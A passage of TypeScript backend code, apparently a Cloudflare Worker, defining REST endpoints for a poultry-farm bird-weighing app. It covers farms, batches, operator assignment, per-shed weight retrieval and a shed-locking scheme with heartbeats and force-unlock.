              const variance = weights.reduce((acc: number, val: number) => acc + Math.pow(val - avg, 2), 0) / (count - 1);
              const stdDev = Math.sqrt(variance);
              cv = Math.round((stdDev / avg) * 10000) / 100;
            }

            if (l.gender === 'FEMALE') {
              allFemaleWeights.push(...weights);
            } else {
              allMaleWeights.push(...weights);
            }

            linesBreakdown.push({
              lineId: l.id,
              lineName: l.line_name,
              shedName: l.shed_name,
              partName: l.part_name,
              gender: l.gender,
              stdWeight: std,
              birdCount: count,
              averageWeight: avg,
              uniformityPercent: uniformityPct,
              cvPercent: cv,
            });
          }

          const calcGroupStats = (weightsList: number[]) => {
            const count = weightsList.length;
            if (count === 0) return { count: 0, avg: 0, uniformity: 0 };
            const avg = Math.round((weightsList.reduce((a, b) => a + b, 0) / count) * 10) / 10;
            const inRange = weightsList.filter(w => w >= avg * 0.9 && w <= avg * 1.1).length;
            return {
              count,
              avg,
              uniformity: Math.round((inRange / count) * 1000) / 10,
            };
          };

          return jsonResponse({
            success: true,
            analytics: {
              totalBirds: allFemaleWeights.length + allMaleWeights.length,
              female: calcGroupStats(allFemaleWeights),
              male: calcGroupStats(allMaleWeights),
              linesBreakdown,
            },
          });
        }

        // -------------------------------------------------------------
        // E. FARMS REST ENDPOINTS: GET /api/farms, POST /api/farms
        // -------------------------------------------------------------
        if (path === '/farms' || path === '/farms/') {
          if (method === 'GET') {
            if (!env.DB) {
              return jsonResponse([]);
            }
            await ensureBatchesTable(env);
            const includeArchived = url.searchParams.get('includeArchived') === 'true';
            const farmsRes = includeArchived
              ? await env.DB.prepare('SELECT * FROM farms ORDER BY created_at DESC').all()
              : await env.DB.prepare('SELECT * FROM farms WHERE is_archived = 0 ORDER BY created_at DESC').all();

            const farms = farmsRes.results || [];
            const summaries: any[] = [];

            const allUsersRes = await env.DB.prepare('SELECT id, name, role, assigned_farms, assigned_farm_id FROM users').all().catch(() => ({ results: [] }));
            const allUsers = (allUsersRes.results || []) as any[];

            for (const f of farms) {
              const activeBatch = await ensureFarmActiveBatch(env, f);
              const shedCountRes = await env.DB.prepare('SELECT COUNT(*) as count FROM sheds WHERE farm_id = ?').bind(f.id).first() as any;
              const subCountRes = await env.DB.prepare('SELECT COUNT(*) as count FROM submissions WHERE farm_id = ?').bind(f.id).first() as any;

              const assignedUsers = allUsers.filter(u => {
                if (u.assigned_farm_id === f.id) return true;
                try {
                  const list = JSON.parse(u.assigned_farms || '[]');
                  return Array.isArray(list) && (list.includes(f.id) || list.includes(f.name));
                } catch {
                  return false;
                }
              });
              const assignedUserNames = assignedUsers.map(u => {
                const r = (u.role || '').toUpperCase();
                const display = (r === 'ADMIN' || r === 'MANAGER') ? 'Manager' : (r === 'INCHARGE' ? 'In-Charge' : 'Supervisor');
                return `${u.name} (${display})`;
              });

              summaries.push({
                id: f.id,
                name: f.name,
                location: f.location,
                flockDate: activeBatch?.startDate || f.flock_date || f.created_at,
                ageWeek: f.age_week || 'W1',
                season: f.season || 'Summer',
                updatedAt: f.updated_at || f.created_at,
                isArchived: Boolean(f.is_archived),
                activeBatch,
                startDate: activeBatch?.startDate || f.flock_date,
                startWeekNumber: activeBatch?.startWeekNumber || 1,
                assignedUserNames,
                _count: {
                  sheds: shedCountRes?.count || 0,
                  submissions: subCountRes?.count || 0,
                },
              });
            }

            return jsonResponse(summaries);
          }

          if (method === 'POST') {
            const body = await request.json().catch(() => ({})) as any;
            const farmId = `farm-${Date.now()}`;
            const farmName = (body.name || 'New Farm').trim();
            const season = body.season || 'Summer';
            const ageWeek = body.ageWeek || 'W1';
            const flockDate = body.flockDate || new Date().toISOString().split('T')[0];
            const shedCount = Math.min(Math.max(Number(body.shedCount) || 10, 1), 40);

            const createdSheds: any[] = [];
            const startWeekNum = parseInt(String(ageWeek || 'W1').replace(/\D/g, '') || '1', 10);
            const batchId = `batch-${farmId}-1`;

            if (env.DB) {
              await ensureBatchesTable(env);
              await env.DB.prepare(
                'INSERT INTO farms (id, name, season, age_week, flock_date) VALUES (?, ?, ?, ?, ?)'
              ).bind(farmId, farmName, season, ageWeek, flockDate).run();

              // Automatically initialize default Batch 1 for the new farm
              await env.DB.prepare(`
                INSERT INTO batches (id, farm_id, batch_name, start_date, start_week_number, status)
                VALUES (?, ?, 'Batch 1', ?, ?, 'ACTIVE')
              `).bind(batchId, farmId, flockDate, startWeekNum).run().catch(() => {});
            }

            // Pre-create sheds, parts, and lines with Line-level Gender and empty weights
            for (let sIdx = 1; sIdx <= shedCount; sIdx++) {
              const shedId = `shed-${farmId}-${sIdx}`;
              const shedName = `Shed ${sIdx}`;
              if (env.DB) {
                await env.DB.prepare(
                  'INSERT INTO sheds (id, farm_id, name) VALUES (?, ?, ?)'
                ).bind(shedId, farmId, shedName).run().catch(() => {});
              }

              const partsList: any[] = [];
              // 2 Parts per shed
              for (let pIdx = 1; pIdx <= 2; pIdx++) {
                const partId = `part-${shedId}-${pIdx}`;
                const partName = pIdx === 1 ? 'Part 1' : 'Part 2';
                if (env.DB) {
                  await env.DB.prepare(
                    'INSERT INTO parts (id, shed_id, name) VALUES (?, ?, ?)'
                  ).bind(partId, shedId, partName).run().catch(() => {});
                }

                const linesList: any[] = [];
                // 5 Lines per part
                for (let lIdx = 1; lIdx <= 5; lIdx++) {
                  const lineId = `line-${partId}-${lIdx}`;
                  // Default to FEMALE for main grower lines, MALE for line 5
                  const gender = (sIdx === shedCount || lIdx === 5) ? 'MALE' : 'FEMALE';
                  const std = gender === 'MALE' ? 150 : 140;

                  if (env.DB) {
                    await env.DB.prepare(
                      'INSERT INTO lines (id, part_id, line_number, name, gender, std_weight_grams) VALUES (?, ?, ?, ?, ?, ?)'
                    ).bind(lineId, partId, lIdx, `Line ${lIdx}`, gender, std).run().catch(() => {});
                  }

                  linesList.push({
                    id: lineId,
                    name: `Line ${lIdx}`,
                    lineNumber: lIdx,
                    gender,
                    stdWeight: std,
                    targetBirdCount: 0,
                    weights: [],
                  });
                }

                partsList.push({
                  id: partId,
                  name: partName,
                  lines: linesList,
                });
              }

              createdSheds.push({
                id: shedId,
                farmId,
                name: shedName,
                type: sIdx === shedCount ? 'Male' : 'Female',
                targetBirdCount: 0,
                locked: false,
                lockedByUserId: null,
                lockedByUserName: null,
                lockedAt: null,
                lastHeartbeatAt: null,
                recordedByUserId: null,
                recordedByUserName: null,
                birdCount: 0,
                weights: [],
                status: 'PENDING',
                savedStatus: 'PENDING',
                totalBirdCount: 0,
                parts: partsList,
              });
            }

            return jsonResponse({
              id: farmId,
              name: farmName,
              season,
              ageWeek,
              flockDate,
              shedCount,
              sheds: createdSheds,
              activeBatch: {
                id: batchId,
                farmId,
                batchName: 'Batch 1',
                startDate: flockDate,
                startWeekNumber: startWeekNum,
                status: 'ACTIVE',
              },
            }, 201);
          }
        }

        // -------------------------------------------------------------
        // E2. BATCHES REST ENDPOINTS: GET & POST /api/farms/:id/batches
        // -------------------------------------------------------------
        const farmBatchesMatch = path.match(/^\/farms\/([^/]+)\/batches$/);
        if (farmBatchesMatch) {
          const farmId = decodeURIComponent(farmBatchesMatch[1]);
          if (method === 'GET') {
            if (!env.DB) return jsonResponse({ success: true, batches: [] });
            await ensureBatchesTable(env);
            const farm = await env.DB.prepare('SELECT * FROM farms WHERE id = ?').bind(farmId).first() as any;
            if (!farm) return errorResponse('Farm not found', 404);

            await ensureFarmActiveBatch(env, farm);
            const batchesRes = await env.DB.prepare(
              'SELECT * FROM batches WHERE farm_id = ? ORDER BY created_at DESC'
            ).bind(farmId).all();

            const batches = (batchesRes.results || []).map((b: any) => ({
              id: b.id,
              farmId: b.farm_id,
              batchName: b.batch_name,
              startDate: b.start_date,
              startWeekNumber: b.start_week_number,
              status: b.status,
              createdAt: b.created_at,
              updatedAt: b.updated_at,
            }));

            return jsonResponse({ success: true, batches });
          }

          if (method === 'POST') {
            if (!env.DB) return jsonResponse({ success: true, message: 'D1 not bound' });
            await ensureBatchesTable(env);
            const farm = await env.DB.prepare('SELECT * FROM farms WHERE id = ?').bind(farmId).first() as any;
            if (!farm) return errorResponse('Farm not found', 404);

            const body = await request.json().catch(() => ({})) as any;

            // 1. Mark existing batches as COMPLETED (read-only)
            await env.DB.prepare(
              'UPDATE batches SET status = ?, updated_at = CURRENT_TIMESTAMP WHERE farm_id = ?'
            ).bind('COMPLETED', farmId).run();

            // 2. Determine new batch name
            const countRes = await env.DB.prepare(
              'SELECT COUNT(*) as count FROM batches WHERE farm_id = ?'
            ).bind(farmId).first() as any;
            const count = (countRes?.count || 0) + 1;
            const batchName = (body.batchName || `Batch ${count}`).trim();
            const startDate = body.startDate || new Date().toISOString().split('T')[0];
            const startWeekNumber = Number(body.startWeekNumber) || 1;
            const batchId = `batch-${farmId}-${Date.now()}`;

            // 3. Create new ACTIVE batch
            await env.DB.prepare(`
              INSERT INTO batches (id, farm_id, batch_name, start_date, start_week_number, status)
              VALUES (?, ?, ?, ?, ?, 'ACTIVE')
            `).bind(batchId, farmId, batchName, startDate, startWeekNumber).run();

            // 4. Release any active locks so new batch starts fresh
            await env.DB.prepare(`
              UPDATE sheds SET
                locked_by_user_id = NULL,
                locked_by_user_name = NULL,
                locked_at = NULL,
                last_heartbeat_at = NULL
              WHERE farm_id = ?
            `).bind(farmId).run().catch(() => {});

            const newBatch = {
              id: batchId,
              farmId,
              batchName,
              startDate,
              startWeekNumber,
              status: 'ACTIVE',
            };

            return jsonResponse({
              success: true,
              batch: newBatch,
              message: `Started ${batchName} successfully for farm ${farm.name}.`,
            }, 201);
          }
        }

        // GET /api/farms/:id
        const singleFarmMatch = path.match(/^\/farms\/([^/]+)$/);
        if (singleFarmMatch) {
          const farmId = decodeURIComponent(singleFarmMatch[1]);
          if (method === 'GET') {
            if (!env.DB) {
              return jsonResponse({ id: farmId, name: 'Active Farm', sheds: [] });
            }

            await ensureShedWeekStatusTable(env);
            await ensureBatchesTable(env);

            const farm = await env.DB.prepare('SELECT * FROM farms WHERE id = ?').bind(farmId).first() as any;
            if (!farm) return errorResponse('Farm not found', 404);

            const activeBatch = await ensureFarmActiveBatch(env, farm);
            const requestedBatchId = url.searchParams.get('batchId');
            const targetBatchId = requestedBatchId || activeBatch?.id;

            // Fetch all batches for this farm
            const allBatchesRes = await env.DB.prepare(
              'SELECT * FROM batches WHERE farm_id = ? ORDER BY created_at DESC'
            ).bind(farmId).all().catch(() => ({ results: [] }));
            const batchesList = (allBatchesRes.results || []).map((b: any) => ({
              id: b.id,
              farmId: b.farm_id,
              batchName: b.batch_name,
              startDate: b.start_date,
              startWeekNumber: b.start_week_number,
              status: b.status,
            }));

            // Check if selected batch is the initial/first batch for legacy backward compatibility
            const firstBatch = batchesList.length > 0 ? batchesList[batchesList.length - 1] : null;
            const isInitialBatch = Boolean(firstBatch && firstBatch.id === targetBatchId);

            const targetWeek = (url.searchParams.get('week') || farm.age_week || 'W18').toUpperCase();

            // Check if submission exists for this specific week and batch
            const subForWeek = isInitialBatch
              ? await env.DB.prepare(
                  'SELECT * FROM submissions WHERE farm_id = ? AND UPPER(flock_age) = ? AND (batch_id = ? OR batch_id IS NULL) ORDER BY created_at DESC LIMIT 1'
                ).bind(farmId, targetWeek, targetBatchId).first() as any
              : await env.DB.prepare(
                  'SELECT * FROM submissions WHERE farm_id = ? AND UPPER(flock_age) = ? AND batch_id = ? ORDER BY created_at DESC LIMIT 1'
                ).bind(farmId, targetWeek, targetBatchId).first() as any;

            // Fetch shed saves for this week and batch from shed_week_status
            const shedWeekStatuses = isInitialBatch
              ? await env.DB.prepare(
                  'SELECT * FROM shed_week_status WHERE farm_id = ? AND UPPER(week) = ? AND (batch_id = ? OR batch_id IS NULL)'
                ).bind(farmId, targetWeek, targetBatchId).all().catch(() => ({ results: [] }))
              : await env.DB.prepare(
                  'SELECT * FROM shed_week_status WHERE farm_id = ? AND UPPER(week) = ? AND batch_id = ?'
                ).bind(farmId, targetWeek, targetBatchId).all().catch(() => ({ results: [] }));
            const swsMap = new Map((shedWeekStatuses.results || []).map((s: any) => [s.shed_id, s]));

            const shedsRes = await env.DB.prepare('SELECT * FROM sheds WHERE farm_id = ?').bind(farmId).all();
            const sheds: any[] = [];
            let totalFarmBirds = 0;
            let savedShedsCount = 0;

            for (const s of shedsRes.results || []) {
              const partsRes = await env.DB.prepare('SELECT * FROM parts WHERE shed_id = ?').bind(s.id).all();
              const parts: any[] = [];
              let shedBirdCount = 0;

              for (const p of partsRes.results || []) {
                const linesRes = await env.DB.prepare('SELECT * FROM lines WHERE part_id = ? ORDER BY line_number ASC').bind(p.id).all();
                const lines: any[] = [];

                for (const l of linesRes.results || []) {
                  // Strictly filter weights by line_id, targetWeek AND batch
                  const weightsRes = isInitialBatch
                    ? await env.DB.prepare(
                        'SELECT weight_grams FROM bird_weights WHERE line_id = ? AND UPPER(week) = ? AND (batch_id = ? OR batch_id IS NULL) ORDER BY entry_index ASC'
                      ).bind(l.id, targetWeek, targetBatchId).all()
                    : await env.DB.prepare(
                        'SELECT weight_grams FROM bird_weights WHERE line_id = ? AND UPPER(week) = ? AND batch_id = ? ORDER BY entry_index ASC'
                      ).bind(l.id, targetWeek, targetBatchId).all();

                  const weights = (weightsRes.results || []).map((w: any) => w.weight_grams);
                  shedBirdCount += weights.length;

                  lines.push({
                    id: l.id,
                    name: l.name,
                    gender: l.gender,
                    weights,
                  });
                }

                parts.push({
                  id: p.id,
                  name: p.name,
                  lines,
                });
              }

              totalFarmBirds += shedBirdCount;
              const sws: any = swsMap.get(s.id);
              const isSaved = sws?.status === 'SAVED';
              if (isSaved) savedShedsCount++;

              const last = s.last_heartbeat_at ? new Date(s.last_heartbeat_at).getTime() : 0;
              const isLocked = Boolean(s.locked_by_user_id && last && (Date.now() - last <= 120_000) && (!s.locked_week || s.locked_week.toUpperCase() === targetWeek.toUpperCase()));

              sheds.push({
                id: s.id,
                name: s.name,
                locked: isLocked,
                lockedByUserId: isLocked ? s.locked_by_user_id : null,
                lockedByUserName: isLocked ? s.locked_by_user_name : null,
                lockedAt: isLocked ? s.locked_at : null,
                lastHeartbeatAt: isLocked ? s.last_heartbeat_at : null,
                // Stage 2: Team Visibility attributes strictly scoped to targetWeek
                savedStatus: isSaved ? 'SAVED' : (shedBirdCount > 0 ? 'DRAFT' : 'PENDING'),
                savedByUserId: isSaved ? (sws?.saved_by_user_id || null) : null,
                savedByUserName: isSaved ? (sws?.saved_by_user_name || null) : null,
                totalBirdCount: isSaved ? (sws?.total_bird_count || 0) : shedBirdCount,
                savedAt: isSaved ? (sws?.saved_at || null) : null,
                parts,
              });
            }

            const totalShedsCount = sheds.length;
            const allShedsSaved = totalShedsCount > 0 && savedShedsCount >= totalShedsCount;
            const selectedBatch = batchesList.find(b => b.id === targetBatchId) || activeBatch;

            // Fetch assigned user names for this farm
            const farmUsersRes = await env.DB.prepare('SELECT id, name, role, assigned_farms, assigned_farm_id FROM users').all().catch(() => ({ results: [] }));
            const farmAssignedUsers = ((farmUsersRes.results || []) as any[]).filter(u => {
              if (u.assigned_farm_id === farmId) return true;
              try {
                const list = JSON.parse(u.assigned_farms || '[]');
                return Array.isArray(list) && (list.includes(farmId) || list.includes(farm.name));
              } catch {
                return false;
              }
            });
            const assignedUserNames = farmAssignedUsers.map(u => {
              const r = (u.role || '').toUpperCase();
              const display = (r === 'ADMIN' || r === 'MANAGER') ? 'Manager' : (r === 'INCHARGE' ? 'In-Charge' : 'Supervisor');
              return `${u.name} (${display})`;
            });

            return jsonResponse({
              ...farm,
              ageWeek: targetWeek,
              activeBatch,
              batches: batchesList,
              currentBatch: selectedBatch,
              startDate: selectedBatch?.startDate || farm.flock_date,
              startWeekNumber: selectedBatch?.startWeekNumber || 1,
              status: subForWeek ? 'COMPLETED' : 'DRAFT',
              assignedUserNames,
              audit: subForWeek ? {
                status: 'COMPLETED',
                lastSubmittedAt: subForWeek.created_at,
                lastSubmittedBy: subForWeek.submitted_by,
                lastSubmittedRole: subForWeek.submitted_role,
                submittedBy: subForWeek.submitted_by,
                submittedRole: subForWeek.submitted_role,
                totalBirdsSubmitted: subForWeek.total_birds,
                batchId: subForWeek.batch_id,
                batchName: subForWeek.batch_name,
              } : null,
              farmProgress: {
                totalShedsCount,
                savedShedsCount,
                totalFarmBirds,
                allShedsSaved,
                progressPercent: totalShedsCount > 0 ? Math.round((savedShedsCount / totalShedsCount) * 100) : 0,
              },
              allShedsSaved,
              sheds,
            });
          }

          if (method === 'DELETE') {
            if (env.DB) {
              await env.DB.prepare('UPDATE farms SET is_archived = 1 WHERE id = ?').bind(farmId).run();
            }
            return jsonResponse({ success: true, message: 'Farm archived' });
          }
        }

        // POST /api/farms/:id/assign-operators - Assign Field Operators to Farm
        const farmAssignOperatorsMatch = path.match(/^\/farms\/([^/]+)\/assign-operators$/);
        if (farmAssignOperatorsMatch && method === 'POST') {
          const farmId = decodeURIComponent(farmAssignOperatorsMatch[1]);
          const body = await request.json().catch(() => ({})) as any;
          const operatorUserIds: string[] = body.operatorUserIds || body.operatorIds || [];

          if (!Array.isArray(operatorUserIds)) {
            return errorResponse('operatorUserIds must be an array of user IDs', 400);
          }

          if (!env.DB) {
            return jsonResponse({
              success: true,
              farmId,
              assignedUserNames: [],
              count: 0,
            });
          }

          await ensureUsersTable(env);
          const farm = await env.DB.prepare('SELECT id, name FROM farms WHERE id = ?').bind(farmId).first() as any;
          if (!farm) {
            return errorResponse('Farm not found in database', 404);
          }

          // Query all users to update their farm assignments
          const allUsersRes = await env.DB.prepare(
            'SELECT id, name, role, assigned_farms, assigned_farm_id FROM users'
          ).all().catch(() => ({ results: [] }));
          const allUsers = (allUsersRes.results || []) as any[];

          const updatedAssignedUserNames: string[] = [];

          for (const user of allUsers) {
            const isManagerOrAdmin = (user.role || '').toUpperCase() === 'ADMIN' || (user.role || '').toUpperCase() === 'MANAGER';
            // Only update assignments for field operators or explicit target users
            const isTarget = operatorUserIds.includes(user.id);

            // Skip modifying Admin/Manager assignedFarms unless explicitly targeted
            if (isManagerOrAdmin && !isTarget) {
              continue;
            }

            const currentSet = new Set<string>();
            if (user.assigned_farms) {
              try {
                const parsed = JSON.parse(user.assigned_farms);
                if (Array.isArray(parsed)) {
                  parsed.forEach((item: string) => {
                    if (item && item !== '*') currentSet.add(item);
                  });
                }
              } catch {}
            }

            let newAssignedFarmId = user.assigned_farm_id;

            if (isTarget) {
              currentSet.add(farm.id);
              currentSet.add(farm.name);
              newAssignedFarmId = farm.id;
              const r = (user.role || '').toUpperCase();
              const displayRole = (r === 'ADMIN' || r === 'MANAGER') ? 'Manager' : (r === 'INCHARGE' ? 'In-Charge' : 'Supervisor');
              updatedAssignedUserNames.push(`${user.name} (${displayRole})`);
            } else {
              currentSet.delete(farm.id);
              currentSet.delete(farm.name);
              if (newAssignedFarmId === farm.id) {
                const remaining = Array.from(currentSet).filter(id => id.startsWith('farm-'));
                newAssignedFarmId = remaining.length > 0 ? remaining[0] : null;
              }
            }

            const newAssignedFarmsJson = JSON.stringify(Array.from(currentSet));
            await env.DB.prepare(
              'UPDATE users SET assigned_farm_id = ?, assigned_farms = ? WHERE id = ?'
            ).bind(newAssignedFarmId, newAssignedFarmsJson, user.id).run().catch(() => {});
          }

          return jsonResponse({
            success: true,
            farmId,
            assignedUserNames: updatedAssignedUserNames,
            count: updatedAssignedUserNames.length,
          });
        }

        // PUT /api/farms/:id/details
        const farmDetailsMatch = path.match(/^\/farms\/([^/]+)\/details$/);
        if (farmDetailsMatch && method === 'PUT') {
          const farmId = decodeURIComponent(farmDetailsMatch[1]);
          const body = await request.json().catch(() => ({})) as any;
          if (env.DB && body.name) {
            await env.DB.prepare('UPDATE farms SET name = ?, updated_at = CURRENT_TIMESTAMP WHERE id = ?').bind(body.name, farmId).run();
          }
          return jsonResponse({ success: true, message: 'Farm details updated' });
        }

        // PUT /api/farms/:id/sync
        const farmSyncMatch = path.match(/^\/farms\/([^/]+)\/sync$/);
        if (farmSyncMatch && method === 'PUT') {
          const farmId = decodeURIComponent(farmSyncMatch[1]);
          const body = await request.json().catch(() => ({})) as any;
          if (env.DB && body.sheds && Array.isArray(body.sheds)) {
            // Save state / sync lines
            for (const s of body.sheds) {
              for (const p of s.parts || []) {
                for (const l of p.lines || []) {
                  if (l.gender) {
                    await env.DB.prepare('UPDATE lines SET gender = ? WHERE id = ?').bind(l.gender.toUpperCase(), l.id).run().catch(() => {});
                  }
                }
              }
            }
          }
          return jsonResponse({ success: true, farmId });
        }

        // -------------------------------------------------------------
        // SHED CONCURRENCY LOCKING & OPERATOR ATTRIBUTION (LIVE-STATE)
        // -------------------------------------------------------------
        const liveStateFarmMatch = path.match(/^\/farms\/([^/]+)\/(?:shed-locks|live-state)$/);
        if (path === '/sheds/locks' || liveStateFarmMatch) {
          if (method === 'GET') {
            const farmIdParam = liveStateFarmMatch ? decodeURIComponent(liveStateFarmMatch[1]) : url.searchParams.get('farmId');
            const targetWeek = (url.searchParams.get('week') || 'W18').toUpperCase();
            const locks: Record<string, any> = {};
            let totalShedsCount = 0;
            let savedShedsCount = 0;
            let totalFarmBirdsCount = 0;

            if (env.DB) {
              await ensureShedWeekStatusTable(env);
              await ensureShedLockColumns(env);

              const allShedsRes = farmIdParam
                ? await env.DB.prepare('SELECT id, farm_id, name, locked_by_user_id, locked_by_user_name, locked_at, last_heartbeat_at, locked_week, locked_batch_id, recorded_by_user_id, recorded_by_user_name FROM sheds WHERE farm_id = ?').bind(farmIdParam).all().catch(() => ({ results: [] }))
                : await env.DB.prepare('SELECT id, farm_id, name, locked_by_user_id, locked_by_user_name, locked_at, last_heartbeat_at, locked_week, locked_batch_id, recorded_by_user_id, recorded_by_user_name FROM sheds').all().catch(() => ({ results: [] }));

              // Query shed saves for this week
              const swsRes = farmIdParam
                ? await env.DB.prepare('SELECT * FROM shed_week_status WHERE farm_id = ? AND UPPER(week) = ?').bind(farmIdParam, targetWeek).all().catch(() => ({ results: [] }))
                : await env.DB.prepare('SELECT * FROM shed_week_status WHERE UPPER(week) = ?').bind(targetWeek).all().catch(() => ({ results: [] }));
              
              const swsMap = new Map((swsRes.results || []).map((row: any) => [row.shed_id, row]));
              const shedsList = allShedsRes.results || [];
              totalShedsCount = shedsList.length;

              for (const s of shedsList) {
                const last = s.last_heartbeat_at ? new Date(s.last_heartbeat_at).getTime() : 0;
                const isLocked = Boolean(
                  s.locked_by_user_id &&
                  last &&
                  (Date.now() - last <= 120_000) &&
                  (!s.locked_week || s.locked_week.toUpperCase() === targetWeek)
                );
                const sws: any = swsMap.get(s.id);
                const isSaved = sws?.status === 'SAVED';
                if (isSaved) savedShedsCount++;

                const birdsInShed = sws?.total_bird_count || 0;
                totalFarmBirdsCount += birdsInShed;

                locks[s.id] = {
                  shedId: s.id,
                  shedName: s.name,
                  farmId: s.farm_id,
                  locked: isLocked,
                  lockedByUserId: isLocked ? s.locked_by_user_id : null,
                  lockedByUserName: isLocked ? s.locked_by_user_name : null,
                  lockedAt: isLocked ? s.locked_at : null,
                  lastHeartbeatAt: isLocked ? s.last_heartbeat_at : null,
                  // Stage 2: Team Visibility attributes strictly scoped to targetWeek
                  savedStatus: isSaved ? 'SAVED' : (birdsInShed > 0 ? 'DRAFT' : 'PENDING'),
                  savedByUserId: isSaved ? (sws?.saved_by_user_id || null) : null,
                  savedByUserName: isSaved ? (sws?.saved_by_user_name || null) : null,
                  totalBirdCount: birdsInShed,
                  savedAt: isSaved ? (sws?.saved_at || null) : null,
                  weights: sws?.weights_json ? (() => { try { return JSON.parse(sws.weights_json); } catch { return null; } })() : null,
                };
              }
            }

            const allShedsSaved = totalShedsCount > 0 && savedShedsCount >= totalShedsCount;
            return jsonResponse({
              locks,
              farmProgress: {
                totalShedsCount,
                savedShedsCount,
                totalFarmBirdsCount,
                allShedsSaved,
                progressPercent: totalShedsCount > 0 ? Math.round((savedShedsCount / totalShedsCount) * 100) : 0,
              },
              allShedsSaved,
              week: targetWeek,
              farmId: farmIdParam,
            });
          }
        }

        // -------------------------------------------------------------
        // PERMANENT SHED LOCK: BLOCK POST-CREATION RENAME & DELETE
        // -------------------------------------------------------------
        const singleShedMatch = path.match(/^\/sheds\/([^/]+)$/);
        if (singleShedMatch && (method === 'DELETE' || method === 'PUT' || method === 'PATCH')) {
          return errorResponse('Sheds are permanently locked at farm creation and cannot be renamed or deleted.', 403);
        }

        // POST /api/sheds/:shedId/enter
        const shedEnterMatch = path.match(/^\/sheds\/([^/]+)\/enter$/);
        if (shedEnterMatch && method === 'POST') {
          const shedId = decodeURIComponent(shedEnterMatch[1]);
          const body = await request.json().catch(() => ({})) as any;
          const userId = body.userId || body.lockedByUserId || request.headers.get('x-user-id');
          const userName = body.userName || body.lockedByUserName || request.headers.get('x-user-username') || 'Incharge';
          const targetWeek = (body.week || request.headers.get('x-week') || '').toUpperCase() || null;
          const targetBatchId = body.batchId || null;

          if (!userId) {
            return errorResponse('Authentication required. Please log in.', 401);
          }

          if (env.DB) {
            await ensureShedLockColumns(env);
            const shed = await env.DB.prepare('SELECT * FROM sheds WHERE id = ?').bind(shedId).first() as any;
            if (!shed) return errorResponse('Shed not found', 404);

            const last = shed.last_heartbeat_at ? new Date(shed.last_heartbeat_at).getTime() : 0;
            const isLocked = Boolean(
              shed.locked_by_user_id &&
              last &&
              (Date.now() - last <= 120_000) &&
              (!shed.locked_week || !targetWeek || shed.locked_week.toUpperCase() === targetWeek)
            );

            if (shed.locked_by_user_id && shed.locked_by_user_id !== userId && isLocked) {
              return new Response(JSON.stringify({
                locked: true,
                lockedByUserId: shed.locked_by_user_id,
                lockedByUserName: shed.locked_by_user_name || 'Another Incharge',
                message: `⚠️ ${shed.name} is currently being weighed by ${shed.locked_by_user_name || 'another Incharge'}. Only one Incharge can enter a shed at a time.`
              }), {
                status: 409,
                headers: { 'Content-Type': 'application/json', ...CORS_HEADERS, ...NO_CACHE_HEADERS }
              });
            }

            const nowIso = new Date().toISOString();
            await env.DB.prepare(`
              UPDATE sheds SET 
                locked_by_user_id = ?, 
                locked_by_user_name = ?, 
                locked_at = ?, 
                last_heartbeat_at = ?,
                locked_week = ?,
                locked_batch_id = ?
              WHERE id = ?
            `).bind(userId, userName, nowIso, nowIso, targetWeek, targetBatchId, shedId).run().catch(() => {});

            await env.DB.prepare('UPDATE farms SET updated_at = CURRENT_TIMESTAMP WHERE id = ?').bind(shed.farm_id).run().catch(() => {});

            return jsonResponse({
              success: true,
              locked: true,
              shedId,
              shedName: shed.name,
              lockedByUserId: userId,
              lockedByUserName: userName,
              lockedAt: nowIso,
              lastHeartbeatAt: nowIso,
              week: targetWeek,
            });
          }

          return jsonResponse({ success: true, locked: true, shedId, lockedByUserId: userId, lockedByUserName: userName });
        }

        // POST /api/sheds/:shedId/heartbeat
        const shedHeartbeatMatch = path.match(/^\/sheds\/([^/]+)\/heartbeat$/);
        if (shedHeartbeatMatch && method === 'POST') {
          const shedId = decodeURIComponent(shedHeartbeatMatch[1]);
          const body = await request.json().catch(() => ({})) as any;
          const userId = body.userId || body.lockedByUserId || request.headers.get('x-user-id');
          const targetWeek = (body.week || request.headers.get('x-week') || '').toUpperCase() || null;
          const nowIso = new Date().toISOString();

          if (env.DB) {
            const shed = await env.DB.prepare('SELECT * FROM sheds WHERE id = ?').bind(shedId).first() as any;
            if (!shed) return errorResponse('Shed not found', 404);

            const last = shed.last_heartbeat_at ? new Date(shed.last_heartbeat_at).getTime() : 0;
            const isLocked = Boolean(
              shed.locked_by_user_id &&
              last &&
              (Date.now() - last <= 120_000) &&
              (!shed.locked_week || !targetWeek || shed.locked_week.toUpperCase() === targetWeek)
            );

            if (userId && shed.locked_by_user_id && shed.locked_by_user_id !== userId && isLocked) {
              return new Response(JSON.stringify({
                locked: true,
                lockedByUserId: shed.locked_by_user_id,
                lockedByUserName: shed.locked_by_user_name,
                message: `⚠️ ${shed.name} is currently being weighed by ${shed.locked_by_user_name || 'another Incharge'}. Only one Incharge can enter a shed at a time.`
              }), {
                status: 409,
                headers: { 'Content-Type': 'application/json', ...CORS_HEADERS, ...NO_CACHE_HEADERS }
              });
            }

            await env.DB.prepare('UPDATE sheds SET last_heartbeat_at = ? WHERE id = ?').bind(nowIso, shedId).run().catch(() => {});
          }

          return jsonResponse({ success: true, shedId, lastHeartbeatAt: nowIso });
        }

        // POST /api/sheds/:shedId/leave
        const shedLeaveMatch = path.match(/^\/sheds\/([^/]+)\/leave$/);
        if (shedLeaveMatch && method === 'POST') {
          const shedId = decodeURIComponent(shedLeaveMatch[1]);
          const body = await request.json().catch(() => ({})) as any;
          const recordedByUserId = body.recordedByUserId || body.userId;
          const recordedByUserName = body.recordedByUserName || body.userName;

          if (env.DB) {
            await env.DB.prepare(`
              UPDATE sheds SET 
                locked_by_user_id = NULL, 
                locked_by_user_name = NULL, 
                locked_at = NULL, 
                last_heartbeat_at = NULL,
                locked_week = NULL,
                locked_batch_id = NULL
              WHERE id = ?
            `).bind(shedId).run().catch(() => {});
          }

          return jsonResponse({ success: true, shedId, locked: false, recordedByUserId, recordedByUserName });
        }

        // POST /api/sheds/:shedId/force-unlock
        const shedForceUnlockMatch = path.match(/^\/sheds\/([^/]+)\/force-unlock$/);
        if (shedForceUnlockMatch && method === 'POST') {
          const shedId = decodeURIComponent(shedForceUnlockMatch[1]);
          if (env.DB) {
            await env.DB.prepare(`
              UPDATE sheds SET 
                locked_by_user_id = NULL, 
                locked_by_user_name = NULL, 
                locked_at = NULL, 
                last_heartbeat_at = NULL,
                locked_week = NULL,
                locked_batch_id = NULL
              WHERE id = ?
            `).bind(shedId).run().catch(() => {});
          }
          return jsonResponse({ success: true, shedId, locked: false, message: 'Shed forcibly unlocked' });
        }

        // -------------------------------------------------------------
